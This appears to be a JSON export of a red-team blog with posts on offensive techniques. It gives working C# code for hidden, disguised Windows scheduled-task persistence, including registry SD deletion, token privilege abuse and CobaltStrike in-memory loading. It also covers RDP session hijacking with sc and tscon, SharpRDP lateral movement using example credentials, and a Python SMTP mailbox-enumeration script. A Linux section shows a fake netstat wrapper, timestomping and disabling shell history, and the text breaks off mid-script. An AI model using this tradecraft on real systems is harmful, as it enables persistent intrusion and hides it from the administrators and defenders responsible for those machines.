{"meta":{"title":"AnonySec'Blog","subtitle":"","description":"","author":"AnonySec","url":"https://payloads.cn","root":"/"},"pages":[{"title":"分类","date":"2021-01-27T08:34:00.122Z","updated":"2019-12-04T13:50:02.000Z","comments":false,"path":"categories/index.html","permalink":"https://payloads.cn/categories/index.html","excerpt":"","text":""},{"title":"关于","date":"2021-09-14T06:28:28.328Z","updated":"2021-09-14T06:28:28.325Z","comments":false,"path":"about/index.html","permalink":"https://payloads.cn/about/index.html","excerpt":"","text":"Hi there 1234🦸‍ AnonySec📧 anonysec@vip.qq.com✍️ 不甘在奋斗的年纪选择安逸，记录这一路的成长历程。🌙 2019.12.5 凌晨「Hang&#39;Day」"},{"title":"标签","date":"2021-01-29T02:20:26.308Z","updated":"2019-12-04T13:50:11.000Z","comments":false,"path":"tags/index.html","permalink":"https://payloads.cn/tags/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-01-27T08:45:13.836Z","updated":"2021-01-27T08:45:13.836Z","comments":false,"path":"repository/index.html","permalink":"https://payloads.cn/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"Windows计划任务的进阶","slug":"Windows计划任务的进阶","date":"2021-08-05T02:01:10.000Z","updated":"2021-09-01T07:04:53.058Z","comments":true,"path":"2021/0805/.html","link":"","permalink":"https://payloads.cn/2021/0805/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 项目地址：SchTask 本文阐述Windows计划任务在系统中的隐藏方式及工具化的转换。 隐藏前言计划任务作为持久化的机制之一，也被用在红队行动中。但常见的利用方法在被安全软件阻断的同时，也没有达到隐藏效果，并提高了被发现的风险。所以，需要深入理解利用计划任务，规避风险，达到持久控制。 创建计划任务at.exe 在 windows8 开始就弃用了，之后的系统都是使用 schtasks.exe 创建计划任务。schtasks 比 at 更加强大， 使管理员能够在本地或远程计算机上创建、删除、查询、更改、运行和结束计划任务。 运行不带参数的 schtasks.exe 将显示每个已注册任务的状态和下次运行时间。 更多查看 Microsoft 文档 123456schtasks &#x2F;Create [&#x2F;S system [&#x2F;U username [&#x2F;P [password]]]][&#x2F;RU username [&#x2F;RP [password]] &#x2F;SC schedule [&#x2F;MO modifier] [&#x2F;D day][&#x2F;M months] [&#x2F;I idletime] &#x2F;TN taskname &#x2F;TR taskrun [&#x2F;ST starttime][&#x2F;RI interval] [ &#123;&#x2F;ET endtime | &#x2F;DU duration&#125; [&#x2F;K] [&#x2F;XML xmlfile] [&#x2F;V1]] [&#x2F;SD startdate] [&#x2F;ED enddate] [&#x2F;IT] [&#x2F;Z] [&#x2F;F] 命令行1schtasks &#x2F;create &#x2F;tn TestSchtask &#x2F;tr C:\\Windows\\System32\\cmd.exe &#x2F;sc DAILY &#x2F;st 13:00:00 XML 文件计划任务一旦创建成功，将会自动在 %SystemRoot%\\System32\\Tasks 目录生成一个关于该任务的描述性 XML 文件，包含了所有的任务信息。 运行 taskschd.msc ，同时可以在任务计划程序看到刚才所创建的任务，处在程序库的根目录下。 注册表在 Windows XP 时，计划任务注册表路径为 1计算机\\HKEY_LOCAL_MACHINE\\Software\\Microsoft\\SchedulingAgent\\ Windows7 以后变成 1计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\ 以 Windows 10 为例，查看刚才所创建任务计划的键值，路径：计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TestTask Id {GUID}，任务对应的guid编号。 Index 一般任务值为3，其他值未知。 SD Security Descriptor 安全描述符，在Windows中，每一个安全对象实体都拥有一个安全描述符，安全描述符包含了被保护对象相关联的安全信息的数据结构，它的作用主要是为了给操作系统提供判断来访对象的权限。 【 经测试：Windows 7 、Windows Server 2008 无 SD 值、Windows 10 有 SD 值 】 安全软件阻止如果主机存在安全软件，计划任务的创建会被阻止，命令行无法成功创建。（可通过 计划任务API 绕过，工具化利用此点） schtasks /create /tn &quot;TestTask&quot; /ru system /tr C:\\Windows\\System32\\cmd.exe /sc weekly /d mon /st 01:00 隐藏姿势非完全隐藏非完全隐藏一个计划任务，通过修改 \\Schedule\\TaskCache\\Tree 下对应任务的 Index 值，一般情况下值为 3 。 Index 修改 修改 HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\&#123;TaskName&#125; 下对应任务的 Index 值为 0 以 Windows 10 为例，新建计划任务 cmd 的高级安全设置中所有者为 SYSTEM，默认无法更改注册表键值。 更改所有者为 Administrators，并赋予完全控制权限，才能修改注册表键值。 当 Index 修改为 0 后， 利用 taskschd.msc、schtasks.exe 、甚至系统API查询出的所有任务中，都查看不到所创建的任务。但如果知道该任务名称，可以通过 schtasks /query /tn &#123;TaskName Path&#125; 查到。 但在 Windows Server 2008 与 Windows 7 中，修改 Index 键值为 0 ，任务计划程序中仍存在该任务。原因未知 XML 文件删除 删除 %SystemRoot%\\System32\\Tasks 下任务对应的 XML 文件 在 Windows 10 中，删除 XML 文件，并不影响计划任务的运行，且在 taskschd.msc 任务计划程序中，依然存在对应任务； 在 Windows 7 与 Windows Server 2008 中，若删除 XML 文件，任务计划程序中的对应任务也会被删除，并且影响计划任务的运行，但注册表中项值依然存在。 完全隐藏SD 删除 删除 HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\&#123;TaskName&#125;\\SD 删除 %SystemRoot%\\System32\\Tasks 下任务对应的 XML 文件 这样操作，无论何种方式 (排除注册表) 都查不到该任务，较为彻底。因为 SD 就是安全描述符，它的作用主要是为了给操作系统提供判断来访对象的权限，但被删除后，无法判断用户是否有权限查看该任务信息，导致系统直接判断无权限查看。因此在使用 schtasks /query /tn \\Microsoft\\Windows\\AppID\\cmd 查询时，提示“错误: 系统找不到指定的文件”。 但经过测试，Windows 7 、Windows Server 2008 无 SD 值、Windows 10 有 SD 值。 总结Windows 计划任务的隐藏并未绝对，因操作系统存在差异，最终实现的效果也不同。但作为持久化的机制之一，需要深入理解利用。 工具化主要以计划任务的代码开发为主，将手工化转变为工具化。 效果图 实现步骤 选择主机随机进程名作为计划任务程序文件名 将计划任务程序文件复制到 %AppData%\\Microsoft\\Windows\\Themes\\ 中 创建的计划任务名取同一随机进程名 计划任务触发器以分钟为单位，无限期持续 更改 Index、删除 SD 的键值，隐藏计划任务对应的 XML 文件 删除已添加的计划任务 编写代码编写任务计划的工具，需要用到任务计划API：Microsoft.Win32.TaskScheduler.dll。在 Visual Studio 中，可以直接从NuGet程序包中安装获取。当然，也可以从 GitHub TaskScheduler 中下载获取。 随机进程名选择主机随机进程名，作为计划任务程序文件名与计划任务名，主要为了每次运行名称都随机，防止后续被溯源，并且取随机进程名，也是一种隐匿。 1234//选择主机随机进程名Process[] progresses = Process.GetProcesses();Random random = new Random();string randomname = (progresses[random.Next(progresses.Length)].ProcessName); 创建计划任务触发器以分钟为单位，无限期持续的运行所创建的计划任务，主要是为了权限的持久性。如果说只运行一次或持续时间为一天，那对于权限的维持可以说是毫无意义。 计划任务的创建没有放在根路径下，而是创建在\\Microsoft\\Windows\\UPnP\\ 路径下，达到隐匿。 1234567891011121314151617//创建计划任务public static void CreateTask(string randomname, string destinationFile, string min)&#123; TaskDefinition td = TaskService.Instance.NewTask(); td.RegistrationInfo.Author = &quot;Microsoft&quot;; //创建者 td.RegistrationInfo.Description = &quot;UPnPHost Service Settings&quot;; //描述 //计划任务运行时间 Min/无限期 double time = double.Parse(min); TimeTrigger tt = new TimeTrigger(); tt.StartBoundary = DateTime.Now; tt.Repetition.Interval = TimeSpan.FromMinutes(time); td.Triggers.Add(tt); td.Actions.Add(destinationFile, null, null); string taskpath = @&quot;\\Microsoft\\Windows\\UPnP\\&quot; + randomname; TaskService.Instance.RootFolder.RegisterTaskDefinition(taskpath, definition: td, TaskCreation.CreateOrUpdate, null, null, 0);&#125; 隐藏计划任务XML 文件隐藏文中已经说过： 在 Windows 10 中，删除 XML 文件，并不影响计划任务的运行，且在 taskschd.msc 任务计划程序中，依然存在对应任务； 在 Windows 7 与 Windows Server 2008 中，若删除 XML 文件，任务计划程序中的对应任务也会被删除，并且影响计划任务的运行。 为了程序的可用性，这里只能将 XML 文件进行隐藏，而不是删除。 1234567891011//隐藏 %SystemRoot%\\System32\\Tasks 下计划任务对应的 XML 文件public static void HidXml(string taskpath)&#123; string xml = $@&quot;C:\\Windows\\System32\\Tasks&quot; + taskpath; FileInfo info = new FileInfo(xml); if (info.Exists) &#123; info.Attributes = FileAttributes.Hidden; Console.WriteLine($&quot;[*] Hidden task xml file: \\n&#123;xml&#125;&quot;); &#125;&#125; Index 修改通过修改 HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\&#123;TaskName&#125; 下对应任务的 Index 值为 0后，利用 taskschd.msc、schtasks.exe 、API 都查看不到所创建的任务。 首先需要更改注册表对应计划任务项值的高级安全设置中的所有者。在未获取特权模式下，工具运行后提示“拒绝访问”，这显然是权限不足。 可以使用 TokenManipulator 类 ，从而获取特权模式。这就需要在项目中添加一个新的C#类，之后在头部 using CosmosKey.Utils; 。 123456789101112131415try&#123; TokenManipulator.AddPrivilege(&quot;SeRestorePrivilege&quot;); TokenManipulator.AddPrivilege(&quot;SeBackupPrivilege&quot;); TokenManipulator.AddPrivilege(&quot;SeTakeOwnershipPrivilege&quot;); var subKey = Registry.ClassesRoot.OpenSubKey(@&quot;AppID\\&#123;9CA88EE3-ACB7-47c8-AFC4-AB702511C276&#125;&quot;, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership); // code to change owner...&#125;finally&#123; TokenManipulator.RemovePrivilege(&quot;SeRestorePrivilege&quot;); TokenManipulator.RemovePrivilege(&quot;SeBackupPrivilege&quot;); TokenManipulator.RemovePrivilege(&quot;SeTakeOwnershipPrivilege&quot;);&#125; 获取特权模式后，更改注册表项值的所有者为 Administrators，同时要更改注册表项值的权限，这才能对 Index 进行修改操作。 12345678910111213//更改注册表项值的所有者RegistryKey subKey = Registry.LocalMachine.OpenSubKey(regpath,RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRightsTakeOwnership);RegistrySecurity rs = new RegistrySecurity();//设置安全性的所有者为Administratorsrs.SetOwner(new NTAccount(&quot;Administrators&quot;));//为注册表项设置权限subKey.SetAccessControl(rs);//更改注册表项值的权限RegistryAccessRule rar = new RegistryAccessRule(&quot;Administrators&quot;,RegistryRights.FullControl, AccessControlType.Allow);rs.AddAccessRule(rar);subKey.SetAccessControl(rs);subKey.Close(); SD 删除SD 键值的删除，是计划任务完全隐藏项之一，当然要排除在注册表中查看。但经过测试，Windows 7 、Windows Server 2008 无 SD 值、Windows 10 有 SD 值。所以就要做 if 的判断，以免程序报错。 123456789101112131415161718//判断SD键值是否存在（Win7 与 win2008 无SD）public static void RegeditKeyExist(string regpath)&#123; string[] subkeyNames; RegistryKey sd = Registry.LocalMachine.OpenSubKey(regpath, true); subkeyNames = sd.GetValueNames(); foreach (string keyName in subkeyNames) &#123; if (keyName == &quot;SD&quot;) &#123; sd.DeleteValue(&quot;SD&quot;); sd.Close(); return; &#125; &#125; sd.Close(); return;&#125; 删除计划任务修改注册表中的键值 Index 与 SD 后，任务计划程序中就查看不到该任务。通过 TaskCollection 也无法查到此任务，就无法删除所创建的计划任务。 所以，为了工具的完整性，删除代码只做参考，并未引用到程序中。 1234567891011121314151617181920//删除计划任务 (需要管理员权限)public static void DeleteTask(string taskname)&#123; //不要写成 &quot;\\Microsoft\\Windows\\UPnP\\&quot; — 报错 — 找不到 string taskpath = @&quot;\\Microsoft\\Windows\\UPnP&quot;; //获得计划任务 TaskService ts = new TaskService(); TaskCollection tc = ts.GetFolder(taskpath).GetTasks(); //Console.WriteLine($&quot;&#123;tc&#125;&quot;); if (tc.Exists(taskname)) &#123; string dtask = taskpath + &quot;\\\\&quot; + taskname; ts.RootFolder.DeleteTask(dtask); Console.WriteLine(&quot;\\n[+] Successfully delete scheduled task !&quot;); &#125; else &#123; Console.WriteLine(&quot;\\n[!] Please add scheduled task !&quot;); &#125;&#125; DLL文件打包到EXE引用的 Microsoft.Win32.TaskScheduler.dll 并不能直接编译到程序中，每次运行就需要 SchTask.exe 与Microsoft.Win32.TaskScheduler.dll 在同一目录下，否则运行就会报错。 可以使用 ILMerge 将 .Net 的 DLL 文件打包到 EXE 中，直接在 Visual Studio 中使用 NuGet 程序包管理下载安装即可。也可以使用 ILMerge-GUI 图形化版本打包，更加方便。 程序打包后，在 CobaltStrike 中利用 execute-assembly 可以成功在内存中加载运行。 ReferenceOwnership of registry TokenManipulator Class Use ILMerge packaging Task Scheduler for developers","categories":[{"name":"权限维持","slug":"权限维持","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"RDP会话劫持与防御","slug":"RDP会话劫持与防御","date":"2021-07-16T08:14:33.000Z","updated":"2021-08-06T02:56:11.061Z","comments":true,"path":"2021/0716/.html","link":"","permalink":"https://payloads.cn/2021/0716/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 攻击者利用 Windows RDP协议接管以前断开的会话，并以合法用户身份出现以获得系统访问与控制。 RDP 劫持简要在目标系统上获得了本地管理员访问权限，可以在不知道其他用户登录凭据的情况下，攻击者就有可能劫持另一个用户的 RDP 会话。 默认使用 tscon 或任务管理器中进行切换用户，会被要求输入密码。在没有凭据的情况下，无法进行切换会话。 利用过程-服务 query user 、 quser 、 qwinsta 查看会话ID。 创建一个使用系统级权限执行tscon的服务，将劫持ID为2的会话。 12345&#x2F;&#x2F;在注册表和&quot;服务控制管理器&quot;中为服务创建子项和项目。sc create rdp binpath&#x3D; &quot;cmd.exe &#x2F;k tscon 2 &#x2F;dest:console&quot;&#x2F;&#x2F;查询服务的配置信息sc qc rdp 当服务启动时，可以在不知道密码的情况下使用”adminx”用户的会话，达到RDP会话劫持。 1sc start rdp 利用过程-工具 SharpRDPHijack，C#开发的远程桌面协议(RDP)会话劫持工具，用于连接断开的用户会话。 防止 RDP 劫持 强制执行组策略：通过组策略控制远程主机空闲时间自动断开并注销。 运行 &gt; gpedit.msc &gt; 本地计算机 策略 &gt; 计算机配置 &gt; 管理模板 &gt; Windows 组件 &gt; 远程桌面服务 &gt; 远程桌面会话主机 &gt; 会话时间限制 启动进程监控 tscon.exe 的使用，并监控在其参数中使用 cmd.exe /k 或 cmd.exe /c 的服务创建，以防止 RDP 会话劫持。 Reference SharpRDPHijack RDP hijacking attacks","categories":[{"name":"Skills","slug":"Skills","permalink":"https://payloads.cn/categories/Skills/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"横向移动中RDP协议的利用","slug":"横向移动中RDP协议的利用","date":"2021-07-14T09:30:54.000Z","updated":"2021-08-06T02:56:10.977Z","comments":true,"path":"2021/0714/.html","link":"","permalink":"https://payloads.cn/2021/0714/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn SocksOverRDP 工具地址https://github.com/nccgroup/SocksOverRDP，此工具在 RDP 协议的基础上实现了 Socks 代理功能。 测试过程客户端IP：172.16.54.4 配置RDP Client 安装注册DLL： 1regsvr32.exe SocksOverRDP-Plugin.dll 取消注册： 1regsvr32.exe &#x2F;u SocksOverRDP-Plugin.dll 在 RDP Client 中启动 mstsc.exe 时看到如下提示： (默认情况下，客户端组件*.dll* 配置为仅在 localhost 上侦听) 更改默认监听的IP 注册表位置：HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\\AddIns\\SocksOverRDP-Plugin (由 .dll 在注册时自行安装，或者需要从SocksOverRDP-Plugin.reg导入) 启用：0禁用，1启用默认 (默认情况下，处于启用状态，每次启动连接时都会在弹出消息框) ip : 要连接或绑定到的IP port : 连接或绑定到的端口 服务端IP：172.16.54.9 输入口令，成功连接RDP，之后在Server中运行SocksOverRDP-Server.exe。 利用Proxifier测试RDP隧道状态。 利用场景只有 tcp/udp 3389 端口可以进行通信时，可以利用 RDP 协议，建立 Socks 通道。 SharpRDP在不通过 GUI 客户端和 Socks 代理的情况下，基于 RDP 协议进行横向移动。 Windows 中有一个库 mstscax.dll，可以执行任何 RDP 功能。此 DLL 是 Microsoft 终端服务的 ActiveX COM 库，通过利用此 DLL，可以创建控制台应用程序，该控制台应用程序通过 RDP 执行经过身份验证的远程命令执行，而无需 GUI 客户端或 SOCKS 代理。 工具地址https://github.com/0xthirteen/SharpRDP，下载后直接用 Visual Studio 编译运行即可。 测试过程1SharpRDP.exe computername&#x3D;172.16.54.4 username&#x3D;administrator password&#x3D;admin@123 command&#x3D;&quot;calc.exe&quot; 利用上述方法执行命令后，所执行命令会隐藏在 RDP 协议中。 【注：使用 SharpRDP 成功执行命令后，目标机会出现锁屏状态 】 利用场景在不使用传统的 RDP 客户端 GUI 情况下，利用RDP进行横向移动，且目标只有 3389 端口可以进行通信时。其次，可以在没有系统本地管理权限但拥有该系统的 RDP 权限时使用该工具。 Reference Tool Release – Socks Over RDP Lateral Movement over headless RDP with SharpRDP","categories":[{"name":"Skills","slug":"Skills","permalink":"https://payloads.cn/categories/Skills/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"}]},{"title":"验证Exchange邮箱用户是否存在","slug":"验证Exchange邮箱用户是否存在","date":"2021-07-06T06:56:32.000Z","updated":"2021-07-07T07:32:05.601Z","comments":true,"path":"2021/0706/.html","link":"","permalink":"https://payloads.cn/2021/0706/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn SMTP 简单邮件传输协议（Simple Mail Transfer Protocol，SMTP）是在Internet传输电子邮件的事实标准。SMTP是一个相对简单的基于文本的协议。在其之上指定了一条消息的一个或多个接收者（在大多数情况下被确认是存在的），然后消息文本会被传输。可以很简单地通过telnet程序来测试一个SMTP服务器。SMTP使用TCP端口25。要为一个给定的域名决定一个SMTP服务器，需要使用MX (Mail eXchange) DNS。——摘自 百度百科 原理使用 SMTP RCPT TO：返回250状态码，证明邮箱地址存在；返回550状态码，证明邮箱地址不存在。 注意有些公司将邮箱服务设置为Catch-all，这意味该域名下的每个邮箱地址，都会被认为是存在的。 Catch-allCatch-all邮箱：全域设置 (以该邮箱为后缀的任何邮箱名，该邮箱服务器都会接收)例如这个域microsci.com，会设置一个Catch-all邮箱地址如: &#x69;&#x6e;&#102;&#111;&#x40;&#x6d;&#105;&#x63;&#114;&#x6f;&#x73;&#99;&#x69;&#46;&#99;&#111;&#109;，该地址可以用来接收拼错或者无效的来自microsci.com域的邮箱。如sales1@microsci.com是不存在无效的账户。当给这个邮箱&#115;&#97;&#x6c;&#x65;&#x73;&#x31;&#64;&#109;&#105;&#x63;&#114;&#111;&#115;&#99;&#x69;&#46;&#99;&#x6f;&#109;发邮件时，由于&#x73;&#97;&#x6c;&#x65;&#115;&#49;&#x40;&#x6d;&#105;&#99;&#114;&#111;&#x73;&#99;&#x69;&#46;&#99;&#x6f;&#109;邮箱不存在就会把邮件自动转到&#x69;&#110;&#x66;&#x6f;&#64;&#x6d;&#x69;&#99;&#114;&#x6f;&#115;&#x63;&#x69;&#x2e;&#99;&#111;&#x6d; (Catch-all邮箱里)。这样的话，就造成检测该域的邮箱都是通过的。因为该域的邮箱会接受该域下的所有邮箱。然而也有这样的情况，收件人邮件服务器可能会默默地放弃该邮件或事后发送退回邮件。[ 如何配置catch-all，官网文档 配置 catch-all 邮箱 ] 验证过程查找MX记录1nslookup -type&#x3D;MX mail.com 找到两条MX记录，SMTP服务器的地址分别为：mail.com mail exchanger = 10 mx2.mail.com.mail.com mail exchanger = 10 mx.mail.com. 建立连接SMTP默认是TCP端口25，使用telnet命令进行TCP的连接。 12345❯ telnet mx.mail.com 25Trying 180.xx.xx.199...Connected to mx.mail.com.Escape character is &#39;^]&#39;.220 mx.mail.com ESMTP 响应码220，证明连接成功。 HELO/EHLO向服务器表明邮件发送的服务器 12345678❯ HELO mx.mail.com250 mx.mail.com❯ EHLO mx.mail.com250-mx.mail.com250-8BITMIME250-SIZE 68157440250 STARTTLS 响应码250，证明成功。 MAIL FROM表明发件人 12MAIL FROM:&lt;test@mail.com&gt;250 sender &lt;test@mail.com&gt; ok RCPT TO如果 RCPT TO 的响应码是250或者251都表示邮件地址存在，如果响应码是5xx，则表明邮件地址不存在，如果是4xx则代表无法确认。 12345678❯ MAIL FROM:&lt;test@mail.com&gt;250 sender &lt;test@mail.com&gt; ok❯ RCPT TO:&lt;mailsec@mail.com&gt;250 recipient &lt;mailsec@mail.com&gt; ok❯ RCPT TO:&lt;mail@mail.com&gt;550 #5.1.0 Address rejected. 工具化Python Metasploit开篇提到过 Catch-all 。实际上，MAIL服务器如果做了这种配置，任何邮箱地址通过SMTP这种方法都会校验通过。可以使用MSF的 auxiliary/scanner/msmail/onprem_enum 模块进行验证，该模块利用OWA (Outlook Webapp)基于时间的用户枚举。[ 作者文档 onprem_enum.md ] 附: Python代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142# -*- coding: utf-8 -*-import dns.resolverimport argparsefrom socket import *import randomdef ColorPrint(string=&quot;&quot;, flag=&quot;&quot;, verbose=&quot;&quot;): colors = &#123; u&quot;gray&quot;: &quot;2&quot;, u&quot;red&quot;: &quot;31&quot;, u&quot;green&quot;: &quot;32&quot;, u&quot;yellow&quot;: &quot;33&quot;, u&quot;blue&quot;: &quot;34&quot;, u&quot;pink&quot;: &quot;35&quot;, u&quot;cyan&quot;: &quot;36&quot;, u&quot;white&quot;: &quot;37&quot;, &#125; flags = &#123; u&quot;error&quot;: &quot;[-] &quot;, u&quot;warning&quot;: &quot;[!] &quot;, u&quot;info&quot;: &quot;[*] &quot;, u&quot;success&quot;: &quot;[+] &quot;, u&quot;debug&quot;: &quot;&gt;&gt;&gt; &quot;, u&quot;echo&quot;: &quot;&gt;&gt;&gt; &quot; &#125; try: if flag == &#x27;error&#x27;: print(u&quot;\\033[%sm%s%s&quot; % (colors[u&quot;red&quot;], flags[flag], string)) if flag ==&quot;info&quot;: print(u&quot;\\033[%sm%s%s&quot; % (colors[u&quot;white&quot;], flags[flag], string)) if flag == &#x27;echo&#x27; or flag == &#x27;&#x27; or flag == 0: print(u&quot;\\033[%sm%s%s&quot; % (colors[u&quot;white&quot;], flags[flag], string)) if flag == &#x27;success&#x27;: print(u&quot;\\033[%sm%s%s&quot; % (colors[u&quot;green&quot;], flags[flag], string)) if verbose == 1: if flag == &#x27;warning&#x27;: print(u&quot;\\033[%sm%s%s&quot; % (colors[u&quot;yellow&quot;], flags[flag], string)) if flag == &#x27;debug&#x27;: print(u&quot;\\033[%sm%s%s&quot; % (colors[u&quot;white&quot;], flags[flag], string)) except: return 0# 第一步: 获取域名MX 记录def DNSQuery(mailaddr): dns_resolver = dns.resolver.Resolver(configure=False) dns_resolver.timeout = 5 dns_resolver.lifetime = 5 dns_resolver.nameservers = [&#x27;119.29.29.29&#x27;] record = &quot;MX&quot; domain = mailaddr[mailaddr.find(u&quot;@&quot;) + 1:] ColorPrint(&quot;query MX of DNS for %s&quot; % domain, flag= &quot;echo&quot;, verbose=verbose) try: MX = dns_resolver.resolve(domain, record) m = random.randint(0, len(MX)) mx = MX[0].exchange strMx = str(mx)[:-1] assert strMx != u&quot;&quot; except Exception as e: ColorPrint(&quot;query MX of %s failed: %s&quot; % (strMx, e), flag=&quot;error&quot;, verbose=verbose) return 0 ColorPrint(&quot;MX Server: %s&quot; % strMx, flag=&quot;info&quot;, verbose=verbose) return strMx# 第二步: 请求mail服务器def smtpsend(server, port=20, mail_rcptTo=&quot;&quot;): mailserver = (server, port) clientSocket = socket(AF_INET, SOCK_STREAM) helloDomain = server[server.find(u&quot;.&quot;) + 1:] mail_from = &quot;mail@gmail.com&quot; ColorPrint(&quot;connect to %s:%.f&quot; % (server, port), flag=&quot;debug&quot;, verbose=verbose) try: clientSocket.connect(mailserver) recv = clientSocket.recv(1024) recv = recv.decode() if recv[0:3] != &#x27;220&#x27;: ColorPrint(&quot;info: &quot; + recv, flag=&quot;debug&quot;, verbose=verbose) return 0 except Exception as e: ColorPrint(&quot;Error: %s&quot; % e, flag=&quot;error&quot;, verbose=verbose) ColorPrint(&quot;Done. &quot; , flag=&quot;info&quot;, verbose=verbose) return 0 ColorPrint(&quot;Message after connection request: \\n&quot; + recv, flag=&quot;debug&quot;, verbose=verbose) hello_command = &quot;EHLO %s\\r\\n&quot; % helloDomain clientSocket.send(hello_command.encode()) recv1 = clientSocket.recv(1024) recv1 = recv1.decode() ColorPrint(&quot;Message after EHLO command:\\n&quot; + recv1, flag=&quot;debug&quot;, verbose=verbose) if recv1[:3] != &#x27;250&#x27;: ColorPrint(&quot;250 reply not received from server.&quot; + recv1, flag=&quot;error&quot;, verbose=verbose) return 0 mail_from_command = &quot;MAIL FROM:&lt;%s&gt;\\r\\n&quot; % mail_from clientSocket.send(mail_from_command.encode()) recv2 = clientSocket.recv(1024) recv2 = recv2.decode() ColorPrint(&quot;After MAIL FROM command: &quot; + recv2, flag=&quot;debug&quot;, verbose=verbose) rcptTo = &quot;RCPT TO:&lt;%s&gt;\\r\\n&quot; % mail_rcptTo clientSocket.send(rcptTo.encode()) recv3 = clientSocket.recv(1024) recv3 = recv3.decode() if recv3[:3] == &#x27;550&#x27;: ColorPrint(&quot;Account: %s does not exist.&quot; % mail_rcptTo, flag=&quot;error&quot;, verbose=verbose) ColorPrint(&quot;Done. &quot;, flag=&quot;info&quot;, verbose=verbose) return 0 ColorPrint(&quot;Account: %s exists.&quot; % mail_rcptTo, flag=&quot;success&quot;, verbose=verbose) ColorPrint(&quot;After RCPT TO command: %s&quot; % recv3, flag=&quot;debug&quot;, verbose=verbose) quit = &quot;QUIT\\r\\n&quot; clientSocket.send(quit.encode()) recv4 = clientSocket.recv(1024) clientSocket.close() ColorPrint(&quot;Done. &quot; , flag=&quot;info&quot;, verbose=verbose) return mail_rcptToif __name__ == &quot;__main__&quot;: &#x27;&#x27;&#x27; port = 25 verbose = False #详细输出,可输出debug信息 mailaddr = &quot;xxxx@mail.com&quot; # 需要验证的邮箱地址 mail_rcptTo = mailaddr server = DNSQuery(mailaddr) smtpsend(server, port, mail_rcptTo) &#x27;&#x27;&#x27; parser = argparse.ArgumentParser() parser.add_argument(&quot;-e&quot;, &quot;--email&quot;, help=&quot;Verification Email Address.&quot;, required=True) parser.add_argument(&quot;-s&quot;, &quot;--server&quot;, help=&quot;Smtp Server.&quot;) parser.add_argument(&quot;-p&quot;, &quot;--port&quot;, help=&quot;Smtp Server Port.&quot;, default=25, type=int) parser.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, help=&quot;verbose info (choice in [True, False])&quot;, default=False, type=bool) args = parser.parse_args() port = args.port verbose = args.verbose mailaddr = args.email mail_rcptTo = mailaddr server = args.server if server == None: server = DNSQuery(mailaddr) smtpsend(server, port, mail_rcptTo) Reference验证邮箱用户是否存在","categories":[{"name":"信息收集","slug":"信息收集","permalink":"https://payloads.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"Mail","slug":"Mail","permalink":"https://payloads.cn/tags/Mail/"}]},{"title":"Linux 隐匿技巧","slug":"Linux-隐匿技巧","date":"2020-12-01T04:16:00.000Z","updated":"2021-08-06T02:48:08.617Z","comments":true,"path":"2020/1201/.html","link":"","permalink":"https://payloads.cn/2020/1201/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言在内网渗透时，有时需要将工具放在目标机进程执行，但这里就需要考虑隐蔽性的问题。下面所讲的不是什么高大上的技术，只是一些常用的技巧。 进程隐匿netstat 伪装首先，包装下 netstat 命令，ps 路径为：/usr/bin/netstat 之后，创建/usr/local/bin/netstat文件，写入内容： 123#!/bin/bash/usr/bin/ps $@ | grep -Ev &#x27;name|address|port&#x27; 最后，赋予执行权限 chmod +x /usr/local/bin/netstat 执行which netstat看下命令变化： netstat 命令修改前后的对比： 当我们自己使用时，直接用/bin/netstat就 OK 了。 文件隐匿首先，看下 Linux chattr 命令，用于改变文件属性。这项指令可改变存放在ext2文件系统上的文件或目录属性，这些属性共有以下8种模式： a：让文件或目录仅供附加用途 b：不更新文件或目录的最后存取时间 c：将文件或目录压缩后存放 d：将文件或目录排除在倾倒操作之外 i：不得任意更动文件或目录 s：保密性删除文件或目录 S：即时更新文件或目录 u：预防意外删除 实战中常用的为 +a (只能追加，不能删除) 与 +i (不能更改) ： 这里，还需要将 chattr 与 lsattr 命令进程隐藏： 12mv /usr/bin/chattr /usr/bin/chtmv /usr/bin/lsattr /usr/bin/lst 文件时间修改touch -acmr /bin/ls /usr/bin/cht ( 修改 后一个文件时间 与 前一个文件时间 一致) 参数 -a：改变访问时间为当前时间 -m：改变修改时间为当前时间 -c：文件不存在不新建文件 -r：使用参考文件的时间 -d：设置为指定时间 -t：设置档案的时间记录 附: sh脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/bin/bash# history# unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0# pstouch /usr/local/bin/pscat 